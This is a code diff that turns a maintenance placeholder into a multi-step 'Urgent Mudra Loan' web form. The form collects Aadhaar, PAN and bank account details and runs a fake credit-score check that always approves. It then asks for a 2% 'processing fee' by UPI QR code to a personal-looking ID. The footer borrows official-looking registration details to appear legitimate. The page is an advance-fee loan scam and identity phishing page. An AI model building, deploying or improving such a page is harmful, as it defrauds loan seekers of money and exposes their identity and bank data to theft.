@@ -1,49 +1,323 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <link rel="icon" href="images/favicon.png" type="image/png" />
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Under Maintenance</title>
-  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/10406/10406716.png" type="image/png">
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f4f6f8;
-      color: #333;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .box {
-      max-width: 400px;
-      background: #fff;
-      padding: 40px 30px;
-      border-radius: 12px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-    }
-    .box img {
-      width: 80px;
-      margin-bottom: 20px;
-    }
-    .box h2 {
-      color: #1976d2;
-      margin-bottom: 10px;
-    }
-    .box p {
-      font-size: 16px;
-      color: #555;
-    }
-  </style>
+  <title>Mudra Loan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="box">
-    <img src="https://cdn-icons-png.flaticon.com/512/10406/10406716.png" alt="Maintenance Icon">
-    <h2>We're Updating Things</h2>
-    <p>This page is temporarily under maintenance.<br>Please check back soon.</p>
+  <div class="container">
+<!-- Logo Section -->
+<div style="text-align:center; margin-bottom: 10px;">
+ <img src="images/logo.png" alt="Mudra Logo" style="height: 100px; width: auto;">
+</div>
+    <h2>Urgent Mudra Loan</h2>
+
+
+    <!-- Step 1 -->
+    <div class="step active" id="step1">
+      <h3>Step 1: Personal Details</h3>
+      <label>Aadhaar Card Number:</label>
+      <input 
+  type="text" 
+  id="Aadhaar" 
+  maxlength="12" 
+  oninput="this.value = this.value.replace(/[^0-9]/g, ''); limitLength(this, 12)" 
+  placeholder="Enter 12-digit Aadhaar" />
+
+      <div id="AadhaarError" class="error"></div>
+
+      <label>PAN Card Number:</label>
+      <input 
+  type="text" 
+  id="pan" 
+  maxlength="10" 
+  oninput="this.value = this.value.toUpperCase()" 
+  placeholder="Enter 10-character PAN (e.g. ABCDE1234F)"
+/>
+      <div id="panError" class="error"></div>
+<label>Gender:</label>
+<select id="gender">
+  <option selected>Male</option>
+  <option>Female</option>
+  <option>Other</option>
+</select>
+      <label>Qualification:</label>
+<select id="qualification">
+  <option>No Education</option>
+  <option>Class 1–5</option>
+  <option>Class 6–8</option>
+  <option>Class 9–10</option>
+  <option>Class 11–12</option>
+  <option>Diploma</option>
+  <option selected>Graduate</option>
+  <option>Post Graduate</option>
+  <option>PhD</option>
+  <option>Certified Course</option>
+  <option>Others</option>
+</select>
+
+
+<label>Purpose of Loan:</label>
+<select id="loanPurpose">
+  <option>Personal Use</option>
+  <option>Start New Business</option>
+  <option>Business Expansion</option>
+  <option>Working Capital</option>
+  <option>Medical Emergency</option>
+  <option>Foreclose another loan</option>
+  <option>Debt Consolidation</option>
+  <option>Pay Credit Card Dues</option>
+  <option>Car Loan</option>
+  <option>Bike Loan</option>
+  <option>Education</option>
+  <option>Home Renovation</option>
+  <option>Purchase of Equipment</option>
+  <option>Purchase of Inventory</option>
+  <option>Agricultural Use</option>
+  <option>Technology Upgrade</option>
+  <option>Travel / Vacation</option>
+  <option>Marriage</option>
+  <option>Emergency Expenses</option>
+  <option>Other Purpose</option>
+</select>
+<div id="otherPurposeContainer" style="display: none;">
+  <label>Please specify other purpose:</label>
+  <input type="text" id="otherPurposeInput" placeholder="Enter your purpose here" />
+  <div class="error" id="otherPurposeError"></div>
+</div>
+      <label>Monthly Income:</label>
+<select id="income">
+  <option value="below_10000">Below Rs. 10,000</option>
+  <option value="10000_20000">Rs. 10,000 – Rs. 20,000</option>
+  <option value="20000_40000">Rs. 20,000 – Rs. 40,000</option>
+  <option value="40000_60000">Rs. 40,000 – Rs. 60,000</option>
+  <option value="60000_100000">Rs. 60,000 – Rs. 1,00,000</option>
+  <option value="above_100000">Above Rs. 1,00,000</option>
+</select>
+
+      <label>Occupation:</label>
+<select id="occupation">
+  <option>Self Employed</option>
+  <option>Business Owner</option>
+  <option>Government Employee</option>
+  <option>Private Sector Employee</option>
+  <option>Freelancer</option>
+  <option>Farmer</option>
+  <option>Student</option>
+  <option>Homemaker</option>
+  <option>Retired</option>
+  <option>Unemployed</option>
+  <option>Daily Wage Worker</option>
+  <option>Delivery Partner</option>
+  <option>Driver</option>
+  <option>Shopkeeper</option>
+  <option>Other</option>
+</select>
+
+      <div class="button-group">
+        <button onclick="saveAadhaar()">Next</button>
+      </div>
+<!-- ...ei line holo apnar last step7 er pore -->
+
+<!-- ✅ CHECK STATUS BUTTON -->
+<div style="text-align:center; margin-top: 30px;">
+  <button onclick="showStatusCheck()" style="background:#43a047;">Check Application Status</button>
+</div>
+
+    </div>
+
+    <!-- Step 2 -->
+    <div class="step" id="step2">
+      <h3>Hold on! Checking your CIBIL SCORE</h3>
+      <div class="center">
+        <img src="https://i.gifer.com/ZZ5H.gif" width="70" />
+        <p><span id="cibilTimer">10</span> seconds remaining</p>
+      </div>
+      <div class="button-group">
+        <button onclick="prevStep(2)">Back</button>
+      </div>
+    </div>
+    <!-- Step 3 -->
+    <div class="step" id="step3">
+      <div class="banner">
+        🎉 Congratulations! You are eligible for a loan!
+        <strong>Eligible up to: Rs. <span id="eligibleAmount">0</span></strong>
+      </div>
+      <h3>Select Loan Amount</h3>
+      <input type="range" id="loanSlider" min="10000" step="10000" oninput="updateLoan(this.value)">
+      <div class="value-display">Selected: Rs. <span id="loanDisplay">10000</span></div>
+
+      <div class="button-group">
+        <button onclick="prevStep(3)">Back</button>
+        <button onclick="nextStep(3)">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 4 -->
+    <div class="step" id="step4">
+      <h3>Step 4: EMI Details</h3>
+      <label>EMI Tenure:</label>
+      <select id="emiTenure" onchange="calculateEMI()">
+        <option value="3">3 Months</option>
+        <option value="6">6 Months</option>
+        <option value="12">12 Months</option>
+        <option value="24">24 Months</option>
+        <option value="36">36 Months</option>
+      </select>
+
+      <div class="card-row">
+        <div class="card">
+          <h4>Loan Amount</h4>
+          <p>Rs. <span id="loanFinal">0</span></p>
+        </div>
+        <div class="card">
+          <h4>Total Payable</h4>
+          <p>Rs. <span id="totalPayable">0</span></p>
+        </div>
+        <div class="card">
+          <h4>Monthly EMI</h4>
+          <p>Rs. <span id="emiAmount">0</span></p>
+        </div>
+      </div>
+
+      <div class="button-group">
+        <button onclick="prevStep(4)">Back</button>
+        <button onclick="nextStep(4)">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 5: Bank Details -->
+    <div class="step" id="step5">
+      <h3>Step 5: Enter Bank Details</h3>
+      <label>Bank Account Number:</label>
+      <input type="text" id="bankAccount" />
+      <div class="error" id="bankAccountError"></div>
+
+      <label>IFSC Code:</label>
+      <input type="text" id="ifscCode" />
+      <div class="error" id="ifscError"></div>
+
+      <label>Account Holder Name:</label>
+      <input type="text" id="accountHolder" />
+      <div class="error" id="accountHolderError"></div>
+
+      <div class="button-group">
+        <button onclick="prevStep(5)">Back</button>
+        <button onclick="validateBankDetails()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 6: QR & UPI -->
+    <div class="step" id="step6">
+      <h3>Final Step: Service Charge Payment</h3>
+      <div class="center">
+        <p>Please pay <strong>2% of loan amount</strong> as processing fee.</p>
+        <h2 style="color:#e53935;">Payable: Rs. <span id="serviceCharge">0</span></h2>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=onecliq@ptyes" alt="QR Code" width="200" />
+        <p><strong>UPI ID:</strong> onecliq@ptyes</p>
+      </div>
+
+      <div class="button-group">
+        <button onclick="prevStep(6)">Back</button>
+        <button onclick="nextStep(6)">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 7: Final Message -->
+    <div class="step" id="step7">
+      <h3 style="color: #43a047;">Your application is under verification</h3>
+      <div class="center">
+        <img src="https://cdn-icons-png.flaticon.com/512/6334/6334645.png" width="100" alt="verifying" />
+        <p style="font-size: 18px; margin-top: 10px;">Amount will be credited to your bank account within <strong>3–4 hours</strong>.</p>
+      </div>
+      <div class="button-group">
+        <button onclick="prevStep(7)">Back</button>
+        <button onclick="location.reload()">Submit</button>
+      </div>
+    </div>
+
+<!-- Step 8: Status Check Form -->
+<div class="step" id="statusCheck">
+  <h3>🔍 Check Your Loan Application</h3>
+  <label>Enter Aadhaar Number:</label>
+  <input 
+  type="text" 
+  id="statusAadhaar" 
+  maxlength="12" 
+  oninput="this.value=this.value.replace(/\D/g,''); limitLength(this, 12);" 
+  placeholder="Enter 12-digit Aadhaar"
+/>
+
+  <div id="statusError" class="error"></div>
+
+  <div class="button-group">
+    <button onclick="checkStatus()">Check Status</button>
+    <button onclick="location.reload()">Home</button>
   </div>
+</div>
+
+<!-- Step 9: Status Roadmap -->
+<div class="step" id="statusResult">
+  <h3 style="text-align:center; color:#1e88e5;">🛣️ Application Status</h3>
+  <div class="banner">
+    Your application is under verification
+  </div>
+<p class="verifying-text">Please wait while our system is verifying your credentials...</p>
+
+<div class="vertical-roadmap">
+  <div class="vertical-step success">
+    <div class="vertical-step-circle">1</div>
+    <div>Received</div>
+  </div>
+  <div class="vertical-step error">
+    <div class="vertical-step-circle">2</div>
+    <div>Under Verification</div>
+  </div>
+  <div class="vertical-step">
+    <div class="vertical-step-circle">3</div>
+    <div>Bank Verified</div>
+  </div>
+  <div class="vertical-step">
+    <div class="vertical-step-circle">4</div>
+    <div>Amount Credited</div>
+  </div>
+</div>
+
+
+
+  <div class="button-group">
+    <button onclick="hideStatusResult()">Back</button>
+    <button onclick="location.reload()">Home</button>
+  </div>
+</div>
+</div>
+<!-- Step 7: Final Message -->
+<div class="step" id="step7">...</div>
+
+<!-- ✅ Paste these 2 below -->
+<div class="step" id="statusCheck">...</div>
+<div class="step" id="statusResult">...</div>
+
+</div> <!-- container -->
+
+  </div>
+
+<!-- Footer Info -->
+<div style="text-align:center; font-size: 13px; color: #777; margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd;">
+  <p><strong>CIN:</strong> U65100MH2015PLC274695</p>
+  <p><strong>Registered Office:</strong><br>
+  SWAVALAMBAN BHAVAN, C-11, G-BLOCK, BANDRA KURLA COMPLEX,<br>
+  BANDRA EAST, MUMBAI – 400 051</p>
+  <p><strong>Helpline No:</strong> 18003456195<br>
+     <strong>Email:</strong> help@mudra.org.in</p>
+</div>
+<a href="javascript:goHome()" class="floating-home-btn" title="Go Home">
+  🏠
+</a>
+<script src="script.js"></script>
 </body>
 </html>
